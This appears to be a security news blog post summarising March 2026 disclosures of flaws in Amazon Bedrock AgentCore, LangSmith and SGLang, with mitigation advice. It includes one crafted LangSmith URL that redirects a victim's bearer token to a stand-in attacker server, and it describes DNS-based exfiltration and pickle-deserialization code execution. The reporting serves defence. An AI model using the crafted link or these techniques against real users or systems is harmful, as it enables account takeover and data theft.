---
title: "AI Flaws in Amazon Bedrock, LangSmith, and SGLang Enable Data Exfiltration and RCE"
slug: "ai-flaws-in-amazon-bedrock-langsmith-and-sglang-enable-data-exfiltration-and-rce"
date: "2026-03-19"
author: "AI Security Brief"
excerpt: "Three independent research teams disclosed critical vulnerabilities across Amazon Bedrock AgentCore, LangSmith, and SGLang in March 2026 — collectively enabling DNS-based data exfiltration, account takeover, and unauthenticated remote code execution against AI infrastructure. One of these flaws remains unpatched, and CERT/CC has issued a public advisory."
category: "AI Threats"
featured: false
meta_title: "AI Flaws in Amazon Bedrock, LangSmith, and SGLang: Data Exfiltration and RCE"
meta_description: "Critical vulnerabilities in Amazon Bedrock, LangSmith (CVE-2026-25750), and SGLang (CVE-2026-3059, CVE-2026-3060) enable DNS exfiltration, account takeover, and unauthenticated RCE."
keywords:
  - Amazon Bedrock DNS exfiltration
  - LangSmith CVE-2026-25750 account takeover
  - SGLang RCE CVE-2026-3059
  - AI infrastructure vulnerabilities 2026
  - pickle deserialization remote code execution
read_time: "7 min"
---

# AI Flaws in Amazon Bedrock, LangSmith, and SGLang Enable Data Exfiltration and RCE

Three independent security research teams published findings in March 2026 documenting significant vulnerabilities across three widely deployed AI infrastructure platforms: Amazon Bedrock AgentCore, the LangSmith LLM observability platform, and SGLang, an open-source LLM serving framework. The flaws are distinct in mechanism and severity, but share a common thread — each exploits the gap between how AI platforms are assumed to operate and how they actually behave in production.

One of the three sets of vulnerabilities remains unpatched at the time of writing, with CERT/CC having issued a public advisory. Another was classified by the affected vendor as "intended functionality." The third was quietly fixed in a point release four months ago. Taken together, they illustrate why AI infrastructure demands the same adversarial scrutiny applied to traditional enterprise software — and why that scrutiny is still far from standard.

---

## Amazon Bedrock AgentCore: DNS as a Covert Channel

**Researcher:** Kinnaird McQuade, Chief Security Architect, BeyondTrust  
**Severity:** CVSS 7.5 | No CVE assigned  
**Disclosed:** September 2025

Amazon's Bedrock AgentCore Code Interpreter service, launched in August 2025, runs code in an isolated sandbox environment — and specifically advertises a "no network access" configuration for security-conscious deployments. BeyondTrust's Kinnaird McQuade found that this isolation is incomplete in a significant way: the sandbox permits outbound DNS queries even in the restricted configuration.

That is not a minor oversight. DNS is one of the oldest exfiltration channels in the attacker playbook precisely because it is so rarely inspected at the egress layer. McQuade's research demonstrated that an attacker with the ability to influence code executed within a Bedrock AgentCore sandbox can establish **bidirectional command-and-control via DNS** — encoding data in query subdomains, receiving attacker instructions in DNS A record responses, and effectively running an interactive reverse shell through a protocol the sandbox's "no network access" mode was meant to block.

The practical damage depends on what IAM permissions are associated with the sandbox's execution role. If the role has been granted access to S3 buckets — a common configuration in agentic pipelines that process documents or retrieve retrieval-augmented generation (RAG) data — the attacker can enumerate and exfiltrate bucket contents, with all traffic traversing the DNS channel that security tooling is unlikely to flag. Payload delivery is also bidirectional: attackers can push executable content into the sandbox via DNS A records.

Amazon's response, communicated after BeyondTrust's September 2025 disclosure, was that the DNS behavior is "intended functionality." Amazon does recommend that customers configure VPC mode and enable DNS firewalls — but this guidance is not the default, and many deployments will not have followed it.

Jason Soroko, Senior Fellow at Sectigo, outlined the practical remediation path: migrate Bedrock AgentCore workloads to VPC mode, apply security groups and network ACLs to restrict outbound traffic at the VPC layer, configure Route53 Resolver DNS Firewalls to block queries to untrusted or anomalous domains, and conduct an IAM audit to ensure sandbox execution roles follow least-privilege principles with no unnecessary S3 or secrets access.

That last step is the most important. The DNS channel is the attack mechanism, but an overprivileged IAM role is what determines the blast radius. A sandbox role scoped only to the resources it legitimately needs limits what an attacker can reach even if the DNS channel remains open. Reviewing IAM roles across AI service integrations — using tools like IAM Access Analyzer or AWS CloudTrail Insights — is the most immediate risk reduction measure available to teams running Bedrock AgentCore today.

---

## LangSmith: URL Parameter Injection Leads to Account Takeover

**Researchers:** Liad Eliyahu and Eliana Vuijsje, Miggo Security  
**CVE:** CVE-2026-25750 | **CVSS:** 8.5  
**Fixed in:** LangSmith v0.12.71 (December 2025)

LangSmith — LangChain's observability and evaluation platform for LLM applications — contains a URL parameter injection vulnerability that allows an attacker to steal authenticated users' credentials without any interaction beyond clicking a link. The vulnerability, discovered by Miggo Security researchers Liad Eliyahu and Eliana Vuijsje, was assigned CVE-2026-25750 with a CVSS score of 8.5.

The mechanism is a failure to validate the `baseUrl` parameter accepted by the LangSmith Studio interface. A crafted URL of the form:

```
smith.langchain.com/studio/?baseUrl=https://attacker-server.com
```

causes LangSmith to issue API requests to the attacker-controlled server rather than to the legitimate LangSmith backend. Because those requests include the user's authentication headers, the attacker receives the victim's **bearer token, user ID, and workspace ID** — everything needed to authenticate as that user and operate fully within their LangSmith workspace.

What an attacker can access with a compromised LangSmith account is substantial. LangSmith is designed for inspecting and debugging LLM applications, which means it stores **trace histories, SQL queries, CRM data interactions, and proprietary prompts and application code** for every run logged to the platform. For organisations using LangSmith to observe production LLM pipelines, this is not just an account compromise — it is a window into AI system internals, including the data those systems have processed.

The vulnerability affects both the cloud-hosted version of LangSmith and self-hosted deployments. This matters operationally: organisations that self-hosted LangSmith under the assumption that on-premises deployment reduces their exposure are equally affected and equally required to patch.

The fix was released in LangSmith version 0.12.71 in December 2025. Organisations running any prior version should treat this as a critical update. The Miggo researchers' finding also highlights a persistent weakness in web-facing AI tooling: the assumption that an internal development or observability tool receives less adversarial attention than a customer-facing product. That assumption is incorrect for any platform that stores LLM trace data.

The attack requires social engineering — a victim must follow the crafted link — but that bar is lower than it might appear. LangSmith Studio links are routinely shared among developers collaborating on AI pipeline debugging. A poisoned link distributed through Slack, email, or a shared project document would not look unusual in that context.

---

## SGLang: Three Unauthenticated RCE Vulnerabilities — All Unpatched

**Researcher:** Igor Stepansky, Orca Security  
**CVEs:** CVE-2026-3059 (CVSS 9.8), CVE-2026-3060 (CVSS 9.8), CVE-2026-3989 (CVSS 7.8)  
**Status:** UNPATCHED | CERT/CC advisory issued

The SGLang disclosures are the most operationally severe of the three findings. Orca Security researcher Igor Stepansky identified three separate vulnerabilities in SGLang, the open-source LLM inference serving framework widely used for high-throughput multi-GPU deployments. All three involve unsafe deserialization of untrusted data. Two carry CVSS scores of 9.8. None are patched.

SGLang is used specifically at the infrastructure layer — it is the serving engine beneath many production LLM deployments, not a user-facing application. Compromise at this layer means control over model inference itself.

### CVE-2026-3059 and CVE-2026-3060: Unauthenticated RCE via ZMQ and Pickle Deserialization (CVSS 9.8 each)

Both vulnerabilities exploit the same root cause: SGLang uses Python's `pickle.loads()` to deserialize data received over ZMQ (ZeroMQ) message broker connections, with no authentication on those connections.

**CVE-2026-3059** is located in SGLang's multimodal generation module. The ZMQ broker port for this component accepts inbound connections without authentication. An attacker who can reach this port — over the network or locally — can send a crafted pickle payload that executes arbitrary code in the context of the SGLang process.

**CVE-2026-3060** is the same class of vulnerability in SGLang's encoder parallel disaggregation system, the component that handles workload distribution in distributed multi-node inference deployments. The attack surface here is potentially wider: disaggregation infrastructure in multi-GPU or multi-node deployments may expose additional ZMQ endpoints across the cluster network.

The CVSS score of 9.8 for both reflects the combination of network accessibility, zero authentication required, and arbitrary code execution outcome. Exploitation requires no credentials, no social engineering, and no prior access to the target system — only network connectivity to the ZMQ broker port.

### CVE-2026-3989: Insecure Pickle Deserialization in Replay Module (CVSS 7.8)

**CVE-2026-3989** involves an insecure `pickle.load()` call in `replay_request_dump.py`, the module responsible for replaying captured request dumps for debugging or benchmarking. While the CVSS score of 7.8 reflects somewhat more constrained access requirements compared to the 9.8 findings, the exploitability pattern is the same: supplying a maliciously crafted pickle file to this module results in arbitrary code execution.

### Mitigation While Unpatched

Because no patch exists, teams running SGLang must rely entirely on network controls and detection. The immediate mitigation posture includes:

- **Restrict ZMQ port access** using host-based firewalls or security groups to permit connections only from explicitly trusted sources within your inference cluster
- **Network segmentation** — SGLang inference nodes should not be reachable from general enterprise network segments, user-facing systems, or the public internet
- **Monitor for indicators of compromise**: unexpected TCP connections to ZMQ broker ports, unexpected child processes spawned by the SGLang service, file creation in unusual locations by the inference process, and outbound connections to unexpected external destinations

The CERT/CC advisory formalises the public disclosure of these vulnerabilities and provides the authoritative reference for organisations requiring vendor communication or risk management documentation.

The broader concern with unpatched critical vulnerabilities in open-source AI infrastructure is the deployment footprint. SGLang is used precisely where inference throughput is paramount — large-scale production deployments — which means the organisations most exposed are also the ones with the most to lose from inference infrastructure compromise.

---

## The Structural Pattern Across All Three

These three vulnerabilities are not random coincidences in the AI toolchain. They each reflect a recognisable failure mode in how AI infrastructure is built and secured:

**The "it's a feature, not a bug" problem** (Bedrock): Amazon's response that DNS queries from a "no network access" sandbox are intended functionality is technically defensible but operationally misleading. When a security-oriented configuration option does not deliver the isolation it implies, customers cannot be expected to intuit the gap. The burden of communicating that VPC mode is required for genuine network isolation should not fall entirely on post-disclosure advisories.

**The trust boundary failure** (LangSmith): Accepting a server URL as an unauthenticated parameter and using it in credentialed API calls is a SSRF-class design error applied to an authentication flow. Observability and tooling platforms — often given high-trust access to production systems — are underscrutinised targets. The fact that CVE-2026-25750 carried a CVSS 8.5 and was fixed in a point release suggests it was treated as a routine update, not a material credential theft vulnerability.

**The serialization debt in ML infrastructure** (SGLang): Python's `pickle` module has been a known attack vector for well over a decade. Its use in security-sensitive deserialization paths — especially over unauthenticated network channels — is a category of technical debt that the ML engineering community has been slower to retire than the broader software security community. Three independent pickle-based RCE vulnerabilities in a single project in 2026 is not bad luck. It reflects inherited patterns from research code that was never designed for adversarial environments.

For teams that perform threat modelling on AI deployments and investigate hostile infrastructure,
[NordVPN]([AFFILIATE:NORDVPN]) offers a straightforward way to isolate analyst workstations from
untrusted network environments during testing — reducing the risk of lateral exposure when probing
AI component configurations against test servers.

---

## Key Takeaways

- **Amazon Bedrock AgentCore (CVSS 7.5)** permits outbound DNS queries from its "no network access" sandbox, enabling bidirectional C2, interactive reverse shell access, and data exfiltration from S3 buckets if the IAM role is overprivileged. Amazon classifies this as intended functionality.
- **LangSmith CVE-2026-25750 (CVSS 8.5)** allows attackers to steal bearer tokens, user IDs, and workspace IDs via a single crafted URL. The vulnerability affects both cloud-hosted and self-hosted deployments — organisations on versions prior to **v0.12.71** should patch immediately.
- **SGLang carries three unpatched vulnerabilities** — CVE-2026-3059 and CVE-2026-3060 both score **CVSS 9.8** and allow unauthenticated RCE via pickle deserialization over ZMQ; CVE-2026-3989 (CVSS 7.8) introduces a third deserialization path in the replay module. CERT/CC has issued an advisory.
- All three SGLang CVEs exploit Python `pickle` deserialization — a class of vulnerability documented since at least 2011 that persists in ML infrastructure due to inherited research code practices.
- For Bedrock deployments: migrate to VPC mode, apply security groups and NACLs, configure Route53 Resolver DNS Firewalls, and audit IAM roles to enforce least privilege across all agent execution roles.
- For LangSmith: the fix is straightforward — update to **v0.12.71**. Also audit LangSmith access logs for any anomalous `baseUrl` parameter usage in periods prior to patching.
- For SGLang: there is no patch. Apply network segmentation and firewall rules to ZMQ ports now, and monitor for unexpected child processes, unusual file writes, and anomalous outbound connections from inference nodes.

---

## References

1. Ravie Lakshmanan — *AI Flaws in Amazon Bedrock, LangSmith, and SGLang Enable Data Exfiltration and RCE*, The Hacker News (March 17, 2026): [https://thehackernews.com/2026/03/ai-flaws-in-amazon-bedrock-langsmith.html](https://thehackernews.com/2026/03/ai-flaws-in-amazon-bedrock-langsmith.html)

2. CERT/CC — Advisory on SGLang pickle deserialization vulnerabilities (CVE-2026-3059, CVE-2026-3060, CVE-2026-3989): [https://kb.cert.org/vuls/](https://kb.cert.org/vuls/)

3. NVD — CVE-2026-25750 (LangSmith URL parameter injection, CVSS 8.5): [https://nvd.nist.gov/vuln/detail/CVE-2026-25750](https://nvd.nist.gov/vuln/detail/CVE-2026-25750)

4. NVD — CVE-2026-3059 (SGLang unauthenticated RCE via ZMQ, CVSS 9.8): [https://nvd.nist.gov/vuln/detail/CVE-2026-3059](https://nvd.nist.gov/vuln/detail/CVE-2026-3059)

5. NVD — CVE-2026-3060 (SGLang unauthenticated RCE via disaggregation module, CVSS 9.8): [https://nvd.nist.gov/vuln/detail/CVE-2026-3060](https://nvd.nist.gov/vuln/detail/CVE-2026-3060)

6. NVD — CVE-2026-3989 (SGLang insecure pickle deserialization, CVSS 7.8): [https://nvd.nist.gov/vuln/detail/CVE-2026-3989](https://nvd.nist.gov/vuln/detail/CVE-2026-3989)

---

**Stay ahead of AI security threats.** Subscribe to the AI Security Brief newsletter for weekly intelligence on AI-powered attacks, vulnerability disclosures, and defence strategies. [Subscribe now →](/newsletter)
